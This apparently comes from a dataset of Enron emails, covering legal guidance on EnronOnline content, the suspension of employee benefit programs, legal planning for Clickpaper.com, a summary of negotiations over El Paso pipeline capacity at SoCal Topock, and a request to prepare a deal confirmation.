detail and to canvass the general opinions/questions/concerns each of you may 
have.  I intend to have CommodityLogic personnel available to address 
specific questions about the product.

If any of you should have any questions, please feel free to call me.

Thanks.

Thanks, 

 ",,,
4922,"i have just received and not yet read
",,,
4923,"FYI.
",,,FYI
4924,"I am working with outside counsel to prepare a standard set of guidelines to 
be applied in generating content for EOL.  However, I wanted to circulate a 
few general rules of thumb since the final guidelines are not yet ready.

1.  Use of CP names.  As a rule, I would advise against including 
counterparty names in EOL content.  Whether we have the rights to publish a 
name depends upon the contractual relationship with the particular 
counterparty.  As a general rule, I therefore recommend that we just don't 
use names.

2.  Publication of Third Party Content.  If we have a contractual 
relationship with a content provider, we cannot republish information -- 
either in its original form or in a compilation -- unless the republication 
is permitted by the underlying contract.  So, the information should not be 
used unless legal has reviewed the contract.  Since this review takes time, 
it's best to avoid using the information if possible.  With regard to other 
third party sources, I am also concerned about republishing either direct 
copies of or compilations of information derived from third-party sources and 
thus advise that if at all possible, internally generated graphs, charts, 
etc. is much to be preferred.  We need to discuss this issue in greater 
detail early next week.  If we determine that it is desirable to use a 
particular source for a good deal of content, it might make sense to approach 
the content provider to obtain express rights of republication.

3.  General Advisory Language:  We need to avoid language that leads to the 
implication that we are providing advisory services to our counterparties.  
We intend to beef up the Legal and Privacy Statement to make clear that Enron 
is an arms-length trading partner, not an advisor.  However, the content 
included in the site needs to be consistent with this statement.  
Accordingly, we need to avoid phrases like ""we can help you"" (compare to ""we 
offer products that can help you""), ""services"", ""partner"", etc.   I'd like to 
consider deleting from Kal's presentations all information relating to 
Capital Financing, Debt and Equity and Project Financing.  For direct market 
literature, I think these types of discussions have a lot of value.  However, 
the EnronOnline garden may not be an appropriate venue for the information.  
Let's think about this one.

4.  Balance:  We need to avoid ""puffery"" and ensure that all presentations 
are balances.  Thus, we need to present the downside as well as the upside of 
utilizing various products in a balanced manner.  In general, I'm okay with 
the content I've seen thus far on this point, but it is a rule of thumb we 
all need to follow.

As you know, this is an unprecedented time in Enron's history.  We must adapt our employee programs to fit the immediate needs of our company during this time of transition.  It is especially difficult to announce the immediate suspension of the following programs.

?	ClickAtHome - Enron has suspended the ClickAtHome program.  The program will no longer accept new participants, PC orders, or Internet service orders.  Orders submitted and confirmed prior to November 20, 2001 will be honored.  Enron will also discontinue subsidized Internet service.  Effective January 1, 2002, employees who are currently subscribers to subsidized Internet service will be switched to the regular commercial rate of their service provider and be responsible for the entire cost of the service.
?	Matching Gifts and Volunteer Incentive Program (VIP) - Enron's Matching Gift program and VIP grants have been suspended indefinitely.  As we consider the immediate needs of all employees during this trying time, it is appropriate that we discontinue the dollar for dollar match for charitable contributions as well as cash donations recognizing employees' volunteer hours with non-profit organizations.  Matching Gift or VIP submissions received prior to November 20 will be honored.

We regret that we have had to make these changes.  We must continue to look for ways to reduce operating expenses through this transition period.

4939,"Justin and Edmund:

I understand that the two of you are the key legal contacts in London on 
EnronOnline, and I thought that I should contact you regarding 
Clickpaper.com, Enron Net Works' new e-commerce initiative.

Enron is planning to launch next week (with a formal launch in connection 
with Enron Corp.'s analyst meeting on July 25) of a website for Enron's 
trading of pulp and paper products.  The business model is similar to that of 
EnronOnline, but since this website will have a more targeted audience, we 
can expect a broader product offering and greater volumes than is currently 
traded on EnronOnline.  It is anticipated that the site will ultimately have 
global counterparties and will trade physical products at several ""hubs"" 
around the world, although operations will initially be more or less limited 
to the U.S. and Canada.

I understand that the London office has done substantially all of the legal 
work associated with enabling global counterparties to trade on EnronOnline 
(such as adopting appropriate password applications and electronic trading 
agreements and addressing legal issues associated with electronic trading of 
financial and physical products).  While much of that work will be 
transferable to Clickpaper, there may be some unique issues.

I'm not sure if anyone has discussed how to handle the legal work for 
Clickpaper as it expands into European markets, but I thought that I should 
raise the issue.  I don't expect a huge volume of work immediately -- it will 
probably trickle in as the traders expand their operations -- but at some 
point it could become a substantial effort.

I would appreciate any thoughts that you have.

",Mary Cook,,Enron North America Corp.
4961,"Below is a summary of the discussions last week regarding the complaint 
against El Paso for oversubscribing the Socal Topock Point.

The meeting started out by summarizing the dollar impact of the Border cuts 
to Amoco and Burlington of $3 million dollars and the additional fuel costs  
of $15 million that they have incurred when the mainline fuel was reduced and 
the gathering fuel was increased.  Accordingly, producers are seeking a 
minimum of $17  million in compensation in some form or  another.

The biggest concern is that a total of 1.2 bcf/day is being nominated at the 
Socal Topock which can only deliver 540000 mmbtu/day.   Socal Gas stated that 
this problem should go away when there system becomes unbundled (referred to 
as Gatekeeper)..  The proceeding is currently pending CPUC approval and could 
be implemented as early as October 1, 2001.  When the Gatekeeper is 
implemented  , only 540000 mmbtu/day will be accepted at the Socal Topock 
border and must match up with the intra-state transport.  

SoCal Gas suggested taking the 1.2 bcf/day of nominations at the Topock 
delivery point and divide it up based on the original intent of the 
capapcity-  400 to Mohave; 540 to Socal Topock;  and 180 to PGE Topock.  They 
also stated they would accept less than 540 at Topock but  needed a minimum 
of 300 to meet core needs.  However, they wanted some type of compensation if 
their volume was reduced.   They also agreed to live with the status quo 
until the Gatekeeper was implemented.  This would result in firm rights being 
established at Socal Topock based on downstream rights.

Williams owns Block 3 capacity and is willing to look at a CD reduction or a 
reduced take requirement or use of alternate points with a rate adjustment.

After much discussion,  El Paso came back with the following counter proposal:

Recommended interim solution until Socal Gatekeeper implemented.  Does not 
relate to receipt point rights.

1)  Block 1 Capacity will always be alternate to Socal Topock (198000);

2)Block II Capacity can not be sold at PGE Topock (614000)

3) Amoco and OneOk each have a contract 45000/d which can go to Topock or 
Ehrenberg.  It is recommended that they
 give up their Ehrenberg right and keep Topock right and Socal will give up 
like amount at Topock as well as shift an additional  70000 mmbtu/day from 
Topock to Ehrenberg resulting in approx. 115000 being shifted  to Ehrenberg.

4) Rights fro expansion shippers would be carved up as follows:

   Socal Topock   PGE/Mohave Topock
Texaco   40    135
Burlington  26    74
Aero   5    15
Borax   7    12
LADWP  0    36
SWGas   0    20

5) Socal Topock would now be divided as follows:

Expansion Shippers  78000 
Socal Gas           425000
BLK 3                               348000 (25-Amoco;20-Oneok;99-Williams;189 
El Paso Merchant;15-Wlliams)
Total 851000
540 divided by 841 would result in 37 percent cuts or 63 percent thruput.

The producers were not happy with having to live with 37 percent cuts and 
felt that any transport sold after their Sept 28 complaint should be cut off 
the top which would be El Paso merchant services Blk 3.

Separate meetings were then held amongst the Topock shippers to duscuss El 
Paso's counter -proposal.  

Producer group came back and told El Paso that they want the 63 percent 
thruput increased.  Will accept CD reduction, rate design change or other 
forms of compensation.   For  the recommended volumes moved to Mohave/Pge 
Topock, they would consider a 30 percent reduction in CD demand as well as 
converting that path to a 100 volumetric rate.  In other words, if the 
producers used the delivery point, they would pay max rate.  If they did not, 
they would not pay anything.

Block 3 shippers would agree to reduce deliveries to Socal Topock if their 
deals were converted to an agreed upon load factor-maybe 70 percent.  For 
volumes shifted to non-Socal Points , they also want a 100 percent volumetric 
rate.

Bottom-line is  how much dollars is El Paso willing to pay to resolve this 
case.  Each party is requested to submit a proposal to El Paso and they will 
study  its entirety.  No follow-up meeting was scheduled.

Another topic that was also being discussed at the meeting was the perceived 
gaming on the system by the full-requirements customers-ie nominating more 
gas than they need in anticipation of cuts.  It is thought that if this could 
be controlled there may be more certainty in the san juan regarding flows.  
El Paso recommended the following :  Limit noms on Cycle 1 from San Juan 
based on previous day's  total nom from all basins.   No limits on Cycle 
2-4.  This caused some concerns because of week-end load swings 
andfluctuatingpower-plant loads.  However, eoc's were willing to establish a 
technical committee to work on a formula if theSocal Topock point gets 
resolved.

Regarding pooling, El Paso is proposing to add 8 additional pools in the 
keystone and 3 additonal pools in the san juan and 1 additional pool in the 
bondad.  This process is in its early stages of conflict.  Most people (Duke, 
Southern, Williams, Coral)  are not on board with this.  I will keep you 
advised of development.  Please advise if you have any questions.

I just extended a deal with the City of Pasadena for September.  The previous deal was for April thru August and the confirm was prepared by Dan Hyvl.  Could you help me prepare the confirm for the extension?  The term sheet is attached as there are minor changes.  Please let me know if you have any questions or if you are unable to work on this for me.

Thanks,

Kim
